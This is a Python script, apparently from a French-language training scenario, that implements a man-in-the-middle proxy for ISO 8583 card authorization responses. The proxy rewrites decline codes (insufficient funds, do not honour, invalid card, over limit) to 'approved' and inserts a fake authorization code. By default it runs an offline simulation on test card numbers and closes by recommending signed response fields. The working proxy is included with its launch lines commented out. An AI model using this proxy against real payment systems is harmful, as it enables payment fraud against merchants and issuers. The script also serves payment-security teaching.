#!/usr/bin/env python3
"""
Scénario 4 : Authorization Bypass Attack
EXPLOIT : Modification du code réponse dans un message ISO 8583

⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT

Usage: python auth-bypass.py
"""

import socket
import struct
import threading
import time
from typing import Optional, Tuple

# Configuration de l'attaque
CONFIG = {
    'listen_port': 8583,
    'target_host': '127.0.0.1',
    'target_port': 8584,
    'bypass_enabled': True,
    'target_response_codes': ['51', '05', '61', '14'],  # Codes à bypasser
    'replacement_code': '00'  # Approuvé
}


def parse_iso8583_response(data: bytes) -> dict:
    """Parse un message ISO 8583 simplifié"""
    try:
        message = data.decode('utf-8')
        parts = message.split('|')
        
        return {
            'raw': message,
            'mti': parts[0] if len(parts) > 0 else '',
            'pan': parts[1] if len(parts) > 1 else '',
            'processing_code': parts[2] if len(parts) > 2 else '',
            'amount': parts[3] if len(parts) > 3 else '',
            'stan': parts[4] if len(parts) > 4 else '',
            'response_code': parts[5] if len(parts) > 5 else '',  # DE39
            'auth_code': parts[6] if len(parts) > 6 else '',      # DE38
            'fields': parts
        }
    except Exception as e:
        return {'error': str(e), 'raw': data}


def build_iso8583(parsed: dict) -> bytes:
    """Reconstruit un message ISO 8583"""
    return '|'.join(parsed['fields']).encode('utf-8')


def bypass_authorization(parsed: dict) -> Tuple[dict, bool]:
    """
    EXPLOIT: Modifie le code réponse de refusé à approuvé
    """
    original_code = parsed.get('response_code', '')
    bypassed = False
    
    if original_code in CONFIG['target_response_codes'] and CONFIG['bypass_enabled']:
        print("\n" + "=" * 60)
        print("  💀 ATTAQUE EN COURS - AUTHORIZATION BYPASS")
        print("=" * 60)
        print(f"  PAN: ****{parsed.get('pan', '')[-4:]}")
        print(f"  Montant: {int(parsed.get('amount', 0)) / 100:.2f} EUR")
        print(f"  Code original: {original_code} ({get_response_description(original_code)})")
        print(f"  Code modifié:  {CONFIG['replacement_code']} (Approuvé)")
        print("=" * 60 + "\n")
        
        # Modifier le code réponse
        parsed['fields'][5] = CONFIG['replacement_code']
        parsed['response_code'] = CONFIG['replacement_code']
        
        # Générer un faux code d'autorisation
        if not parsed.get('auth_code') or parsed['auth_code'] == '':
            parsed['fields'][6] = 'FAKE01'
            parsed['auth_code'] = 'FAKE01'
        
        bypassed = True
    
    return parsed, bypassed


def get_response_description(code: str) -> str:
    """Retourne la description d'un code réponse"""
    codes = {
        '00': 'Approuvé',
        '05': 'Ne pas honorer',
        '14': 'Numéro de carte invalide',
        '51': 'Fonds insuffisants',
        '61': 'Dépasse le montant limite',
        '91': 'Émetteur non disponible'
    }
    return codes.get(code, 'Inconnu')


class AttackProxy:
    """Proxy MitM pour intercepter les réponses d'autorisation"""
    
    def __init__(self, listen_port: int, target_host: str, target_port: int):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.stats = {'bypassed': 0, 'total': 0}
    
    def handle_client(self, client_socket: socket.socket, address: tuple):
        """Gère une connexion client"""
        try:
            # Recevoir la requête
            request = client_socket.recv(4096)
            self.stats['total'] += 1
            
            # Se connecter au serveur cible
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            server_socket.send(request)
            
            # Recevoir la réponse
            response = server_socket.recv(4096)
            server_socket.close()
            
            # Parser et potentiellement modifier la réponse
            parsed = parse_iso8583_response(response)
            
            if parsed.get('mti') == '0110':  # Authorization Response
                parsed, bypassed = bypass_authorization(parsed)
                if bypassed:
                    self.stats['bypassed'] += 1
                    response = build_iso8583(parsed)
            
            # Envoyer la réponse (potentiellement modifiée)
            client_socket.send(response)
            
        except Exception as e:
            print(f"Erreur: {e}")
        finally:
            client_socket.close()
    
    def start(self):
        """Démarre le proxy"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)
        
        print(f"[Proxy] En écoute sur le port {self.listen_port}")
        
        while True:
            client, address = server.accept()
            thread = threading.Thread(target=self.handle_client, args=(client, address))
            thread.start()


def simulate_attack():
    """Simule l'attaque sans réseau"""
    print("=" * 60)
    print("  🔴 SIMULATION D'ATTAQUE AUTHORIZATION BYPASS")
    print("  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE")
    print("=" * 60)
    
    # Simuler des réponses d'autorisation
    test_responses = [
        b'0110|4111111111111111|000000|000010000|123456|51||',  # Fonds insuffisants
        b'0110|5500000000000004|000000|000005000|234567|00|ABC123|',  # Approuvé (pas de bypass)
        b'0110|340000000000009|000000|000050000|345678|05||',  # Ne pas honorer
        b'0110|6011000000000004|000000|000025000|456789|14||',  # Carte invalide
    ]
    
    print("\n📊 Analyse des réponses interceptées:\n")
    
    bypassed_count = 0
    for i, response in enumerate(test_responses, 1):
        print(f"─── Réponse {i} ───")
        parsed = parse_iso8583_response(response)
        
        print(f"  PAN: ****{parsed.get('pan', '')[-4:]}")
        print(f"  Montant: {int(parsed.get('amount', '0')) / 100:.2f} EUR")
        print(f"  Code original: {parsed.get('response_code')} ({get_response_description(parsed.get('response_code', ''))})")
        
        # Tenter le bypass
        modified, bypassed = bypass_authorization(parsed)
        
        if bypassed:
            bypassed_count += 1
            print(f"  ⚠️ BYPASSÉ → Code: {modified['response_code']}, Auth: {modified['auth_code']}")
        else:
            print(f"  ✓ Non modifié (déjà approuvé)")
        print()
    
    # Résumé
    print("=" * 60)
    print("  📊 RÉSUMÉ DE L'ATTAQUE")
    print("=" * 60)
    print(f"  Réponses analysées: {len(test_responses)}")
    print(f"  Réponses bypassées: {bypassed_count}")
    print(f"  Taux de succès:     {bypassed_count / len(test_responses) * 100:.0f}%")
    
    print("\n" + "-" * 60)
    print("  💡 POURQUOI CETTE ATTAQUE FONCTIONNE:")
    print("-" * 60)
    print("""
  1. Le code réponse (DE39) n'est PAS signé
  2. Le terminal fait confiance au message reçu
  3. Pas de vérification croisée avec le serveur
  
  SOLUTION: Signer les champs critiques (DE38, DE39)
""")
    print("=" * 60)


if __name__ == '__main__':
    # Mode simulation (par défaut)
    simulate_attack()
    
    # Pour lancer le vrai proxy:
    # proxy = AttackProxy(CONFIG['listen_port'], CONFIG['target_host'], CONFIG['target_port'])
    # proxy.start()
